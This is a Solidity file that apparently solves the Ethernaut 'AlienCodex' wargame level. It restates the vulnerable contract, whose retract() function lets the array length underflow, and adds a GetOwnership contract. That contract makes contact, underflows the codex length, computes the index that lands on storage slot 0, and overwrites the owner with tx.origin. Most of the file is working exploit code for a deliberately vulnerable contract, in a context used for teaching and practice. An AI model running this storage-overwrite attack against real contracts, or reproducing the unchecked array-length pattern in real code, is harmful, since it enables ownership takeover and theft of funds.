// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) public contacted {
    codex.push(_content);
  }

  function retract() public contacted {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) public contacted {
    codex[i] = _content;
  }
}

contract GetOwnership {
  AlienCodex ctr;

  constructor(address ctrAddr) public {
    ctr = AlienCodex(ctrAddr);
  }

  function calcIdx() public pure returns (uint) {
    return ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
  }

  function setMeAsOwner() public {
    ctr.make_contact();
    // decrease the codex length (will underflow)
    ctr.retract();
    // set my address in the slot 0 of the storage
    ctr.revise(calcIdx(), bytes32(uint256(uint160(tx.origin))));
  }
}
